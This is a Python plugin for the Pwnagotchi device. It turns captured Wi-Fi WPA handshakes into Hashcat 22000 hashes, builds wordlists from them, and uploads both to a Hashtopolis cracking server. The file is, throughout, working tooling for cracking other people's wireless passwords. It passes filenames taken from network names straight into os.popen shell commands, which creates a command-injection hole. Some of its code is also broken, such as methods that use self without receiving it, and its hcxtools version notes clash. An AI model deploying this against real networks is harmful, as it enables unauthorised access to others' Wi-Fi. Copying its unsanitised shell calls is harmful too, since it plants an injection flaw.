import logging
import base64
import requests
import json
import os

import pwnagotchi.plugins as plugins
from threading import Lock
from pwnagotchi.ui.components import LabeledValue
from pwnagotchi.ui.view import BLACK
import pwnagotchi.ui.fonts as fonts


# This is the main plugin class.
class Pwn2Crack(plugins.Plugin):
    __author__ = "me@CyberGladius.com"
    __version__ = "1.0.2"
    __license__ = "GPL3"
    __description__ = "This Pwnagotchi plugin will evaluate captured handshakes from pcap files, clean and convert complete handshakes to Hashcat-compatible 22000 hashes, and then create a new hashlist within Hashtopolis."
    hcxtools_version_supported = "6.3.2"  # 6.2.7 is Working as 11/2023, later version will not work on Pwnagotchi 1.5.5 because the OS is too old to support OpenSSL 3.0 EVP API.
    __name__ = "Pwn2Crack"
    __help__ = "A plugin that will add age and strength stats based on epochs and trained epochs"
    __dependencies__ = {
        "apt": ["none"],
        "pip": ["scapy"],
    }
    __defaults__ = {
        "enabled": False,
    }
    """
    Pwn2Crack aims to streamline a Red Teamer or PenTester process from handshake capture to cracking passwords.
    This plugin requires  https://github.com/ZerBea/hcxtools/releases/tag/6.2.7
    """

    def __init__(self):
        self.running = False
        self.lock = Lock()
        logging.debug(f"[{self.__class__.__name__}] plugin init")

    # This function is called when the config.toml file is changed. This is needed to be able to read the options of other pluguin from the config.toml file.
    def on_config_changed(self, config):
        self.config = config
        # Test if any  options have been set in the config.toml file.
        if "pwn2crack" not in self.config["main"]["plugins"]:
            logging.error(
                f"[{self.__class__.__name__}] The config.toml file is missing the pwn2crack section. Please add it to the config file."
            )
            self.running = False
            return
        # Check if all required settings have been set in the config.toml file, and if optional setting have been set, set them to default values.
        # Check for the required settings. Disable the plugin if they are not set.
        # Test if  self.config['main']['plugins']['pwn2crack']['htserver'] is set and not empty.
        if "htserver" not in self.config["main"]["plugins"]["pwn2crack"]:
            logging.error(
                f"[{self.__class__.__name__}] The Hashtopolis server is not set. Please set it in the config file."
            )
            self.running = False
            return
        if "accesskey" not in self.config["main"]["plugins"]["pwn2crack"]:
            logging.error(
                f"[{self.__class__.__name__}] The Hashtopolis API key is not set. Please set it in the config file."
            )
            self.running = False
            return

        # Check for the optional settings. If they are not set, set them to default values.
        # If hashisSecret is not set, then set it to True.
        if "hashisSecret" not in self.config["main"]["plugins"]["pwn2crack"]:
            logging.debug(
                f"[{self.__class__.__name__}] The hashisSecret option is not set. Setting it to True."
            )
            self.config["main"]["plugins"]["pwn2crack"]["hashisSecret"] = bool(True)
        # If useBrain not set, then set it to False.
        if "useBrain" not in self.config["main"]["plugins"]["pwn2crack"]:
            logging.debug(
                f"[{self.__class__.__name__}] The useBrain option is not set. Setting it to False."
            )
            self.config["main"]["plugins"]["pwn2crack"]["useBrain"] = bool(False)
        # if brainFeatures is not set, then set it to 0.
        if "brainFeatures" not in self.config["main"]["plugins"]["pwn2crack"]:
            logging.debug(
                f"[{self.__class__.__name__}] The brainFeatures option is not set. Setting it to 0."
            )
            self.config["main"]["plugins"]["pwn2crack"]["brainFeatures"] = int(0)
        # if numhashtoupload is not set, then set it to 0.
        if "numhashtoupload" not in self.config["main"]["plugins"]["pwn2crack"]:
            logging.debug(
                f"[{self.__class__.__name__}] The numhashtoupload option is not set. Setting it to 0."
            )
            self.config["main"]["plugins"]["pwn2crack"]["numhashtoupload"] = int(0)
        # If uploadwordlist is not set, then set it to False.
        if "uploadwordlist" not in self.config["main"]["plugins"]["pwn2crack"]:
            logging.debug(
                f"[{self.__class__.__name__}] The uploadwordlist option is not set. Setting it to False."
            )
            self.config["main"]["plugins"]["pwn2crack"]["uploadwordlist"] = bool(False)
        # If genwordlist is not set, then set it to False.
        if "genwordlist" not in self.config["main"]["plugins"]["pwn2crack"]:
            logging.debug(
                f"[{self.__class__.__name__}] The genwordlist option is not set. Setting it to False."
            )
            self.config["main"]["plugins"]["pwn2crack"]["genwordlist"] = bool(False)

    # This function is called when the plugin is loaded. We will preform some checks to make sure the plugin can run without errors.
    def on_loaded(self):
        # Test if the binary 'hcxtools' is available in the system.
        # If not, we cannot use this plugin. So we will disable it and report an error in the log.
        if not os.path.exists("/usr/bin/hcxpcapngtool"):
            logging.error(
                '[Pwn2Crack] The binary "hcxpcapngtool" is not available on your system. Please install the "hcxtools" package.'
            )
            return
        # Test if the binary 'hcxpcaptool' is on the required version.
        # If not, we cannot use this plugin. So we will disable it and report an error in the log.
        hcxtoolsVersion = (
            os.popen("/usr/bin/hcxpcapngtool --version")
            .read()
            .split(" ")[1]
            .split("\n")[0]
        )
        logging.debug(
            '[Pwn2Crack] The binary "hcxpcapngtool" is on version '
            + hcxtoolsVersion
            + ". The required version is "
            + self.hcxtools_version_supported
            + "."
        )
        if hcxtoolsVersion != self.hcxtools_version_supported:
            logging.error(
                '[Pwn2Crack] The binary "hcxpcapngtool" is not on the required version. Please install the "hcxtools" package.'
            )
            return
        # All checks passed. Enable the plugin.
        logging.debug(
            f"[{self.__class__.__name__}] All Tests passed. Enabling the plugin."
        )
        self.running = True
        logging.info(f"[{self.__class__.__name__}] plugin loaded")

    # On captured handshake, use hcxpcapngtool to confirm the pcap file is a valid handshake, and then convert it to a hashcat 22000 hash. Save the good hashes to a file with a matching name, but with a .22000 extension.
    def on_handshake(self, agent, filename, access_point, client_station):
        if not self.running:
            return

        logging.debug(f"[{self.__class__.__name__}] A handshake was captured.")

        with self.lock:
            # Set the hash output file name.
            # Create a string from the filename, and remove the .pcap extension, add a underscore, add the first 6 charaters of the access_point, and add the .22000 extension.
            # Pwnagotchi stores pcaps as "<AP-ESSID>_<AP-BSSID>.pcap". In some environments, you will have a AP mesh network with multiple APs sharing the same ESSID, different BSSIDs, and all using the same pasword.
            # So we will use the first 6 charaters of the AP's BSSID, since most mesh APs will all be made by the same vendor, and will have the same first 6 charaters of the BSSID. This allows us to wrap all the hashes relaterd to one password into one file.
            self.hash_output_filename = str(filename.split(".")[0])
            # Remove the last six charaters of "self.hash_output_filename".
            self.hash_output_filename = self.hash_output_filename[:-6]
            self.hash_output_filename = self.hash_output_filename + ".22000"
            self.hash_output_filename_wordlist = self.hash_output_filename + ".wordlist"
            # Check if the the hashes have already been uploaded to Hashtopolis. If yes, then we will not convert the pcap file to a hashcat 22000 hash.
            # Check if "self.hash_output_filename + '.uploaded'" exists in "self.config['bettercap']['handshakes']" folder.
            # If yes, then the hashes have already been uploaded to Hashtopolis. If no, then the hashes have not been uploaded to Hashtopolis.
            # This avoids uploading duplicate hashes of the same password to Hashtopolis.
            if os.path.exists(self.hash_output_filename + ".uploaded"):
                logging.debug(
                    f"[{self.__class__.__name__}] The hashes have already been uploaded to Hashtopolis. Skipping the handshake."
                )
                return
            else:
                logging.debug(
                    f"[{self.__class__.__name__}] The hashes have not been uploaded to Hashtopolis. Converting the handshake to 22000 format. - FILE: "
                    + self.hash_output_filename
                )
            # Confirm the pcap file is a valid handshake.
            # Run the hcxpcapngtool command, and save the output to a variable.
            hcxpcapngtool_test_output = os.popen(
                "/usr/bin/hcxpcapngtool -o /dev/null " + filename
            ).read()
            # Check if the output contains the string 'EAPOL pairs written to 22000 hash file'. If no, the pcap file is not a valid PKMID or 4Way handshake. Delete it.
            if "written to 22000 hash file" in hcxpcapngtool_test_output:
                logging.debug(
                    f"[{self.__class__.__name__}] The pcap file is a valid handshake."
                )
                # Set the hcxpcapngtool command to convert the pcap file to a hashcat 22000 hash.
                hcxpcapngtool_cmd = (
                    "/usr/bin/hcxpcapngtool -o "
                    + self.hash_output_filename
                    + " "
                    + filename
                )

                # if the user has set the self.options['genwordlist'] in the config.toml file, then we will generate a wordlist from the captured handshake.
                # Override the hcxpcapngtool_cmd command to generate a wordlist from the captured handshake.
                if self.options["genwordlist"]:
                    hcxpcapngtool_cmd = (
                        "/usr/bin/hcxpcapngtool -E "
                        + self.hash_output_filename_wordlist
                        + " -R "
                        + self.hash_output_filename_wordlist
                        + " -o "
                        + self.hash_output_filename
                        + " "
                        + filename
                    )
                    # Set the hcxeiutool(wordlist genorator from hcxtools) command to generate a wordlist from the captured handshake. If this command is set we will run it later after we confirm the pcap file is a valid handshake.
                    # hcxeiutool -i <InputPcapFileWordlist> -d <tmpWordlist> -x <tmpWordlist> -c <tmpWordlist> -s <tmpWordlist>
                    hcxeiutool_cmd = (
                        "/usr/bin/hcxeiutool -i "
                        + self.hash_output_filename_wordlist
                        + " -d "
                        + self.hash_output_filename_wordlist
                        + " -x "
                        + self.hash_output_filename_wordlist
                        + " -c "
                        + self.hash_output_filename_wordlist
                        + " -s "
                        + self.hash_output_filename_wordlist
                    )
                    logging.debug(
                        f"[{self.__class__.__name__}] Generating a wordlist from the captured handshake."
                    )

                # Run the command to convert the pcap file to a hashcat 22000 hash.
                hcxpcapngtool_output = os.popen(hcxpcapngtool_cmd).read()

                # Check that the output file(filename + '.22000') was created and is not empty.
                if (
                    os.path.exists(self.hash_output_filename)
                    and os.path.getsize(self.hash_output_filename) > 0
                ):
                    logging.debug(
                        f"[{self.__class__.__name__}] The pcap file was converted to a hashcat 22000 hash."
                    )

                    # if the hcxeiutool_cmd is set, then we will generate a wordlist from the captured handshake file.
                    if self.options["genwordlist"]:
                        # Run the command to generate a wordlist from the captured handshake.
                        hcxeiutool_output = os.popen(hcxeiutool_cmd).read()
                        # Check that the output file(self.hash_output_filename_wordlist) was created and is not empty.
                        if (
                            os.path.exists(self.hash_output_filename_wordlist)
                            and os.path.getsize(self.hash_output_filename_wordlist) > 0
                        ):
                            logging.debug(
                                f"[{self.__class__.__name__}] The wordlist was generated from the captured handshake."
                            )
                            # Open the new wordlist file, and read the contents, sort it and remove duplicates, then save it back to the file overwriting the old contents.
                            with open(self.hash_output_filename_wordlist, "r") as file:
                                wordlist = file.readlines()
                                wordlist = sorted(set(wordlist))
                            with open(self.hash_output_filename_wordlist, "w") as file:
                                file.writelines(wordlist)

            # If the output does not contain the string 'written to 22000 hash file', then the pcap file is not a valid PKMID or 4Way handshake. Delete it.
            if "written to 22000 hash file" not in hcxpcapngtool_test_output:
                logging.info(
                    f"[{self.__class__.__name__}] The pcap file is not a valid handshake. Deleting file:"
                    + filename
                )
                os.remove(filename)
                # Confirm the pcap file was deleted.
                if not os.path.exists(filename):
                    logging.debug(
                        f"[{self.__class__.__name__}] The pcap file was deleted for being incomplete. FILE: "
                        + filename
                    )
                # If the pcap file was not deleted, then send an error to the log.
                if os.path.exists(filename):
                    logging.error(
                        f"[{self.__class__.__name__}] Could not delete the pcap file. Please delete it manually. FILE: "
                        + filename
                    )

    # When the Internet is available, upload all the .22000 files in the pwnagotchi handshakes directory to Hashtopolis.
    def on_internet_available(self, agent):
        if not self.running:
            return
        logging.debug(
            f"[{self.__class__.__name__}] Internet is available. Trying to upload hashes."
        )
        # Create a list of all files ending in .22000 in the pwnagotchi handshakes directory.
        hashlist_to_upload = []
        for filename in os.listdir(self.config["bettercap"]["handshakes"]):
            if filename.endswith(".22000"):
                hashlist_to_upload.append(filename)
        # For each file in the list, upload it to Hashtopolis using the API.
        for filename in hashlist_to_upload:
            logging.debug(
                f"[{self.__class__.__name__}] Uploading "
                + filename
                + " to Hashtopolis."
            )
            HTAccess.upload_hash_to_hashtopolis(
                self.config["bettercap"]["handshakes"] + "/" + filename,
                self.options["htserver"],
                self.options["accesskey"],
                self.options["hashisSecret"],
                self.options["useBrain"],
                self.options["brainFeatures"],
                self.options["numhashtoupload"],
            )
        # If self.options['uploadwordlist'] is set to true, then upload the wordlist to Hashtopolis.
        if self.options["uploadwordlist"]:
            # Create a list of all files ending in .wordlist in the pwnagotchi handshakes directory.
            wordlist_to_upload = []
            for filename in os.listdir(self.config["bettercap"]["handshakes"]):
                if filename.endswith(".wordlist"):
                    wordlist_to_upload.append(filename)
                    # Upload the wordlist to Hashtopolis using the API.
            for filename in wordlist_to_upload:
                logging.debug(
                    f"[{self.__class__.__name__}] Uploading "
                    + filename
                    + " to Hashtopolis."
                )
                HTAccess.upload_wordlist_to_hashtopolis(
                    self.config["bettercap"]["handshakes"] + "/" + filename,
                    self.options["htserver"],
                    self.options["accesskey"],
                )


class HTAccess:
    __description__ = (
        "This class contains functions to access Hashtopolis using the APIv1."
    )

    # Upload the hash to Hashtopolis using the API function.
    def upload_hash_to_hashtopolis(
        hashfile,
        htserver,
        accesskey,
        hashisSecret,
        useBrain,
        brainFeatures,
        numhashtoupload,
    ):
        # Set the hashlist name to hashfile but remove leading path and trailing .22000 extension.
        hashlist_name = str(hashfile.split("/")[-1].split(".")[0])

        # Set Hashtopolis APIv1 URL.
        ht_api_url = htserver + "/api/user.php"

        # Read every line in the file, and remove any duplicate lines. Then put the lines back into a string variable.
        with open(hashfile, "r") as file:
            hashlist = file.readlines()
            # if numhashtoupload is greater than 0, then only read the first numhashtoupload lines of the sorted unique list.
            if numhashtoupload > 0:
                hashlist = sorted(set(hashlist))[:numhashtoupload]
            else:
                hashlist = sorted(set(hashlist))
            # Take the hashlist variable, and put it back into a one string variable.
            hash = "".join(hashlist)
        # Encode the hash variable to base64.
        hash = base64.b64encode(hash.encode()).decode()

        # Create a JSON object with all the required information.
        # Example submit new Hashlist JSON.
        # {
        # "section": "hashlist",
        # "request": "createHashlist",
        # "name": "API Hashlist",
        # "isSalted": false,
        # "isSecret": true,
        # "isHexSalt": false,
        # "separator": ":",
        # "format": 0,
        # "hashtypeId": 22000,
        # "accessGroupId": 1,
        # "data": "$(base64 -w 0 hash.hc22000)",
        # "useBrain": false,
        # "brainFeatures": 0,
        # "accessKey": "mykey"
        # }
        request_json_data = {
            "section": "hashlist",
            "request": "createHashlist",
            "name": "%s" % hashlist_name,
            "isSalted": False,
            "isSecret": hashisSecret,
            "isHexSalt": False,
            "separator": ":",
            "format": 0,
            "hashtypeId": 22000,
            "accessGroupId": 1,
            "data": "%s" % hash,
            "useBrain": useBrain,
            "brainFeatures": brainFeatures,
            "accessKey": "%s" % accesskey,
        }
        request_json_data = json.dumps(request_json_data)
        # Make a POST web request to Hashtopolis using APIv1 to submit the new hashlist wih 'Content-Type: application/json' header.
        # If the request is successful, then Hashtopolis will return a JSON object with the new hashlist ID.
        # Example: {"section":"hashlist","request":"createHashlist","response":"OK","hashlistId":198}
        # If the request is not successful, then Hashtopolis will return a JSON object with an error message.
        # Example: {"section":"hashlist","request":"createHashlist","response":"ERROR","message":"Invalid hashlist format!"}
        try:
            request = requests.post(
                ht_api_url,
                data=request_json_data,
                headers={"Content-Type": "application/json"},
            )
        except requests.exceptions.ConnectionError as error_code:
            # If the request fails, send the returned error message to the log.
            logging.error(
                f"[{self.__class__.__name__}] The request to Hashtopolis failed. Check the Hashtopolis server URL and API key."
            )
            logging.debug(error_code)
            return
        # Check if the request was successful and the hashlist ID was returned.
        if request.status_code == 200 and "hashlistId" in request.text:
            logging.debug(
                f"[{self.__class__.__name__}] The hashlist was uploaded to Hashtopolis."
            )
            # Rename the file to filename + '.uploaded' to indicate the file has been uploaded to Hashtopolis.
            os.rename(hashfile, hashfile + ".uploaded")
        # If the request fails, send the returned error message to the log.
        if request.status_code != 200 or "hashlistId" not in request.text:
            logging.error(
                f"[{self.__class__.__name__}] The hashlist was not uploaded to Hashtopolis."
            )
            logging.error(
                f"[{self.__class__.__name__}] Status Code: " + str(request.status_code)
            )
            logging.error(
                f"[{self.__class__.__name__}] Request Data: "
                + str(request.text)
                + " -- "
                + str(hashfile)
            )
            logging.error(
                f"[{self.__class__.__name__}] Request Json Data: "
                + str(request_json_data)
            )

    def upload_wordlist_to_hashtopolis(wordlistfile, htserver, accesskey):
        # Set Hashtopolis APIv1 URL.
        ht_api_url = htserver + "/api/user.php"
        # Set the wordlist name to wordlistfile but remove leading path and trailing .wordlist extension.
        wordlist_name = wordlistfile.split("/")[-1].split(".")[0]
        # Read every line in the file, and remove any duplicate lines. Then put the lines back into one string variable, then base64 encode it.
        with open(wordlistfile, "r") as file:
            wordlist = file.readlines()
            wordlist = sorted(set(wordlist))
            # Take the wordlist variable, and put it back into a one string variable.
            wordlist = "".join(wordlist)
        # Encode the wordlist variable to base64.
        wordlist = base64.b64encode(wordlist.encode()).decode()

        # Create a JSON object with all the required information.
        # Example submit new Hashlist JSON.
        # {
        # "section": "file",
        # "request": "addFile",
        # "filename": "api_test_inline.txt",
        # "fileType": 0,
        # "source": "inline",
        # "accessGroupId": 1,
        # "data": "MTIzNA0KNTY3OA0KcGFzc3dvcmQNCmFiYw==",
        # "accessKey": "mykey"
        # }
        request_json_data = {
            "section": "file",
            "request": "addFile",
            "filename": "%s" % wordlist_name,
            "fileType": 0,
            "source": "inline",
            "accessGroupId": 1,
            "data": "%s" % wordlist,
            "accessKey": "%s" % accesskey,
        }
        request_json_data = json.dumps(request_json_data)
        # Make a POST web request to Hashtopolis using APIv1 to submit the new wordlist file wih 'Content-Type: application/json' header.
        # If the request is successful, then Hashtopolis will return a JSON object with the new wordlist ID.
        # Example: { "section": "file", "request": "addFile", "response": "OK" }
        # If the request is not successful, then Hashtopolis will return a JSON object with an error message.
        # Example: {"section":"file","request":"addFile","response":"ERROR","message":"Invalid file format!"}
        try:
            request = requests.post(
                ht_api_url,
                data=request_json_data,
                headers={"Content-Type": "application/json"},
            )
        except requests.exceptions.ConnectionError as error_code:
            # If the request fails, send the returned error message to the log.
            logging.error(
                f"[{self.__class__.__name__}] The request to Hashtopolis failed. Check the Hashtopolis server URL and API key."
            )
            logging.debug(error_code)
            return
        # Check if the responce was successful and the and the response was 'OK'.
        if request.status_code == 200 and "OK" in request.text:
            logging.debug(
                f"[{self.__class__.__name__}] The wordlist was uploaded to Hashtopolis."
            )
            # Rename the file to filename + '.uploaded' to indicate the file has been uploaded to Hashtopolis.
            os.rename(wordlistfile, wordlistfile + ".uploaded")
        # If the request fails, send the returned error message to the log.
        if request.status_code != 200 or "OK" not in request.text:
            logging.error(
                f"[{self.__class__.__name__}] The wordlist was not uploaded to Hashtopolis."
            )
            logging.error(
                f"[{self.__class__.__name__}] Status Code: " + str(request.status_code)
            )
            logging.error(
                f"[{self.__class__.__name__}] Request Data: "
                + str(request.text)
                + " -- "
                + str(wordlistfile)
            )
            logging.error(
                f"[{self.__class__.__name__}] Request Json Data: "
                + str(request_json_data)
            )
